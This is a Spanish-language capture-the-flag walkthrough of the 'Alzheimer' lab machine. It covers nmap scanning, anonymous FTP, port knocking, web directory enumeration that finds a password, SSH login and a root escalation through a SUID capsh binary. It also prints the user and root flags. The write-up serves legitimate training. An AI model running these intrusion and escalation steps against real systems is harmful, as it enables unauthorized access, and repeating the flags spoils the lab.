# WriteUp: Alzheimer


## Tabla de Contenido
1. [Escaneo Nmap](#nmap-scan)
2. [FTP](#ftp)
3. [PortKnocking](#port-knocking)
4. [Web](#web)
5. [Escalada de privilegios](#escalada-de-privilegios)


## Nmap-Scan

```lua
# Nmap 7.94SVN scan initiated Tue May 20 19:08:10 2025 as: nmap -sCV -p21 -oN target 192.168.19.187
Nmap scan report for 192.168.19.187
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.20.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 08:00:27:FA:6E:F8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 20 19:08:10 2025 -- 1 IP address (1 host up) scanned in 0.45 seconds
```

# FTP

```bash
ftp 192.168.19.187
Connected to 192.168.19.187.
220 (vsFTPd 3.0.3)
Name (192.168.19.187:xaviepunk): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55211|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||59080|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
226 Directory send OK.
```

```bash
cat .secretnote.txt
#need to knock this ports and 
#ne door will be open!
#1000
#2000
#3000
```

## Port Knocking

```bash
knock -v 192.168.19.187 1000 2000 3000
```

```lua
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-20 19:15 CEST
Nmap scan report for 192.168.19.187
Host is up (0.00019s latency).

PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.20.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp filtered ssh
80/tcp open     http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:FA:6E:F8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
```

## Web

```bash
❯ curl http://192.168.19.187/
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa

<!---. --- - .... .. -. --. -->
```

```bash
❯ dirsearch -u http://192.168.19.187 --wordlists=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 220545

Output File: /home/xaviepunk/nose/nmap/reports/http_192.168.19.187/_25-05-20_19-16-18.txt

Target: http://192.168.19.187/

[19:16:18] Starting: 
[19:16:18] 301 -  185B  - /home  ->  http://192.168.19.187/home/
[19:16:18] 301 -  185B  - /admin  ->  http://192.168.19.187/admin/
[19:16:26] 301 -  185B  - /secret  ->  http://192.168.19.187/secret/
```

```bash
❯ curl http://192.168.19.187/home/
Maybe my pass is at home!
-medusa
```

```bash
❯ curl http://192.168.19.187/secret/
Maybe my password is in this secret folder?`
```

```bash
cat .secretnote.txt
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
```
`ssh medusa@192.168.19.187`

user flag `HMVrespectmemories`

## Escalada de privilegios
```bash
find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
```

/usr/sbin/capsh --gid=0 --uid=0 --

root flag `HMVlovememories`


**Autor: Xavier Quintero Carrejo**